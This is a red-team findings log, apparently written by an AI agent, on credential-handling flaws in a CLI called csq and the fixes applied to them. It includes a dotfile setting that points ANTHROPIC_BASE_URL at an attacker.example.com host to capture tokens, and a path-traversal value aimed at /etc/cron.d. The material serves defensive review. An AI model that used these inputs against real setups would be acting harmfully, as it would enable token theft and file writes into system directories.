---
type: RISK
date: 2026-04-10
created_at: 2026-04-10T18:30:00Z
author: agent
session_id: m3-m7-redteam
session_turn: 280
project: csq-v2
topic: Red team findings for M3-M7 (account identity, broker, quota, session, providers, CLI)
phase: redteam
tags: [security, testing, broker, credentials, cli, env-vars]
---

# Red Team Findings: M3 Identity + M4 Broker + M5 Quota + M6 Session + M7 Providers/CLI

Three-agent red team (deep-analyst spec coverage, security-reviewer, testing-specialist) converged on the M3-M7 implementation. Of the 44 planned tasks across those milestones, the library layer was strong but the CLI wiring had several blockers and security issues. All CRITICAL findings and most HIGH findings fixed in this session.

## Critical Findings (All Fixed)

### Security

1. **C1 / H8 — Incomplete ANTHROPIC\_\* env strip in `csq run` and `exec_claude`**. The code only stripped `ANTHROPIC_API_KEY` and `ANTHROPIC_AUTH_TOKEN`, leaving `ANTHROPIC_BASE_URL` and other variants to leak through to the child `claude` process. An attacker who poisoned the user's dotfiles with `ANTHROPIC_BASE_URL=https://attacker.example.com` could exfiltrate all 7+ accounts' live access tokens (and eventually refresh tokens). **Fix**: `strip_sensitive_env()` helper walks the env, removes every key starting with `ANTHROPIC_`, plus `AWS_BEARER_TOKEN_BEDROCK` and `CLAUDE_API_KEY`. Applied to both the isolated `csq run` exec and the vanilla `exec_claude` fallback.

2. **C6 — `broker_check` did not re-read canonical inside the lock**. The code read canonical, checked expiry, acquired the try-lock, and then called refresh — but if another process successfully refreshed between the initial read and the lock acquisition, our copy of the refresh token was already invalidated by Anthropic. Result: broker sees "near expiry" → locks → calls refresh with dead RT → Anthropic returns 401 → recovery path runs → sibling scan writes stale creds → broker-failed flag set → LOGIN-NEEDED for a healthy account. **Fix**: Re-read canonical inside the lock; if it's no longer near-expiry, return `Valid` immediately (another process already refreshed).

3. **C3 / C4 — `csq install` silently wiped user's `settings.json` on parse error AND wrote the wrong key shape**. On JSON parse failure the code called `unwrap_or_else(|_| serde_json::json!({}))` — replacing the user's existing MCP servers, hooks, and custom permissions with an empty object. Additionally, the inserted key was flat `statusLineCommand: "csq statusline"` while CC's schema expects nested `statusLine: {type: "command", command: "..."}` — meaning CC would never invoke the statusline even after a successful install. **Fix**: On parse failure, return an error asking the user to repair the file manually. Use the correct nested schema. Use atomic write via `unique_tmp_path + atomic_replace`.

4. **C8 — No path-traversal validation on `CLAUDE_CONFIG_DIR`**. `current_config_dir()` read the env var and passed the raw string to `swap_to()` and other callers. `CLAUDE_CONFIG_DIR=/etc/cron.d csq swap 1` would call `swap_to` with `/etc/cron.d`, attempting to write `/etc/cron.d/.credentials.json`. **Fix**: New `validated_config_dir()` canonicalizes the path, verifies it's a descendant of `base_dir`, and verifies the name matches `config-N` where N ∈ 1..=999. Rejects traversal attempts, symlink escapes, and malformed names.

### Spec Coverage / Functional

5. **`csq run` stub HTTP refresher marked every account broker-failed on first run**. The run command passed a closure that unconditionally returned `Err("HTTP client not yet wired")`, so `broker_check` attempted recovery (also failed because same closure consumed), then called `set_broker_failed`. After a single `csq run`, the account was in LOGIN-NEEDED state until the 24h stale flag expired. **Fix**: Remove the stub broker call from `csq run` entirely. Honor the broker-failed flag (return error with `csq login N` guidance) and warn if the token is already expired, but don't try to refresh ourselves until the daemon (M8) provides a real HTTP client.

6. **`csq statusline` had no quota update pipeline**. The spec (M5-08) requires parsing CC's `rate_limits` payload and calling `update_quota`. The old code read stdin, discarded it, and just formatted a line. Result: quota tracking was completely broken — `csq status` and the `5h:X%/7d:Y%` display always showed no data. **Fix**: Parse the CC JSON, extract `rate_limits`, call `state::update_quota`. Bounded stdin read (64KB max) to prevent OOM.

7. **`csq models switch` entirely missing**. The CLI only exposed `csq models [provider]` for listing. The library-side `set_model` existed but had no CLI entry point. **Fix**: Added `Models` subcommand enum with `List` and `Switch` variants. `csq models switch <provider> <model>` resolves via catalog (with alias lookup + suggestion on miss), calls `set_model`, and writes the updated settings.

## High Findings (All Fixed)

- **H1** — `setkey` stdin read was unbounded. A 1GB paste would OOM the binary. Fixed with `.take(4096)`.
- **H3** — Temp file names used only `std::process::id()`. Two threads in the same process would collide on the same temp path. Fixed with `unique_tmp_path()` helper that combines PID with a per-process atomic counter. Applied to all 9 call sites.
- **H4** — `key_fingerprint` revealed 14/16 characters of short keys (8 prefix + 6 suffix on a 16-char minimum). Tightened to `first 6 + last 4` with minimum length 20.
- **H6** — `recover_from_siblings` had a monotonicity bypass: on total failure it unconditionally restored the old `original` snapshot, even if another process had successfully refreshed in the meantime. Fixed with `restore_if_not_downgraded()` that re-reads canonical and skips the restore if current is newer than our snapshot.
- **H7** — `verify_swap_after_delay` was defined with tests but never called. Removed the dead code and its tests (will be reintroduced in M8 with a tokio scheduled task).
- **H9** — `CredentialFile` and `OAuthPayload` derived `Debug`. The `extra: HashMap<String, serde_json::Value>` for forward-compat would leak any unknown credential fields CC might add. Custom `Debug` impls now print `extra: "<N unknown fields>"` instead.

## Deferred (M8 or later)

- **C2** — macOS keychain write passes hex payload via argv (visible to `ps`). Requires switching from `security` CLI subprocess to `security-framework` crate. Documented; deferred to M8.
- **C5** — `swap_to` has no lock against concurrent fanout from broker. Requires coordinating lock names between `swap_to`, `broker_check`, `backsync`, and `pullsync`. Deferred.
- **C7** — Windows `mklink /J` via `cmd /C` is a shell injection vector. Requires direct `CreateSymbolicLinkW`/`FSCTL_SET_REPARSE_POINT` via `windows-sys`. Deferred to Windows CI pass.
- **H2 (setkey validation)** — The validation probe framework exists (`validate_key` with injectable HTTP), but the actual HTTP client is deferred to M8. Until then, `setkey` prints a warning that validation will be enabled in M8.
- **H5** — `broker-failed` flag is a touch file that any same-user process can create to DoS an account. Requires HMAC or keychain-backed flag. Accepted under same-user threat model.
- **csq update / auto-update** (M7-10) — entirely missing. Deferred (significant feature: HTTPS client, Ed25519 verification, atomic binary replace).
- **CLI integration tests** — All 11 CLI subcommand handlers lack integration tests. Library is well-tested but CLI wiring is not. Added one unit test (ANTHROPIC strip logic) and 5 `validate_config_dir` unit tests in this session. Broader CLI integration testing deferred.

## Results

- **232 tests passing** (207 core unit + 12 credential + 7 platform + 6 new CLI unit tests)
- **Clippy clean**
- **Verified manually**: install writes correct nested statusLine schema, statusline updates quota.json from rate_limits payload, install refuses on malformed JSON

## For Discussion

1. The redteam flagged that many library functions exist with good tests but aren't called from the CLI (snapshot_account, verify_swap_after_delay, broker_check). We removed verify_swap_after_delay (dead code) and deferred broker_check (needs HTTP client). Should we audit every public function and either wire it up or delete it, or is "library-ready-for-M8" acceptable?

2. The `csq run` change removes the broker call entirely. Users running `csq run` with an expired token now see a warning but still launch CC (which will fail with 401). Should we instead fail hard and tell them to run a future `csq refresh N` command (or wait for the daemon)?

3. The env var strip in `strip_sensitive_env` removes all `ANTHROPIC_*`. Some users may legitimately need `ANTHROPIC_LOG` for CC debugging. Should we maintain an explicit allowlist of safe-to-pass vars, or is "strip everything ANTHROPIC\_\*" the right conservative default?
